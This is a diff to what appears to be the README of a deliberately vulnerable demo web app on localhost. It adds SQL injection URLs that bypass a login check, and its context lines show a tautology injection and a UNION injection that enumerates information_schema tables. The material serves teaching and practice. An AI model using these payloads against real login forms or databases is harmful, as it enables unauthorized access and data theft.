@@ -69,6 +69,11 @@ Simple SQLi
 
     http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo'or'1'='1  
 
+Simple SQLi to bypass login
+
+    http://localhost:8080/loginJdbcUnSafe?name=1&password=1' or 1=1 and id='1    
+    http://localhost:8080/loginJdbcUnSafe?name=1&password=1%27%20or%201=1%20and%20id=%271
+
 Union based SQLi to get table_schema,table_name FROM information_Schema.tables
     
     http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo' union all select 1, concat(table_schema,'-----', table_name), table_name, 'STAFF'   from information_Schema.tables where '1'='1
